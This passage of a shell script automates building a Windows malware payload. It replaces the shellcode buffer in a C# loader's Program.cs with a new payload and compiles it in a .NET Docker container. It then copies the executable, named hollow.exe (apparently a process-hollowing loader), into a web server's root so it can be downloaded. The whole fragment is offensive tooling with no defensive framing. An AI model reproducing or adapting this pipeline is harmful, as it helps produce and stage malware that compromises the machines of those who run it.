...
sed -i "/^.*byte\[\] buf = new byte/c\\$new_payload" ~/Desktop/base/containers/compile_dotnet/workspace/Program.cs

# Compile using .NET SDK Docker container
notify-send "Compiling"
docker run --rm -v ~/Desktop/base/containers/compile_dotnet/workspace:/workspace dotnet-builder

# Copy to webroot
notify-send "Copying to webroot"
cp ~/Desktop/base/containers/compile_dotnet/workspace/bin/Release/net6.0/win-x64/publish/workspace.exe /var/www/html/b/hollow.exe
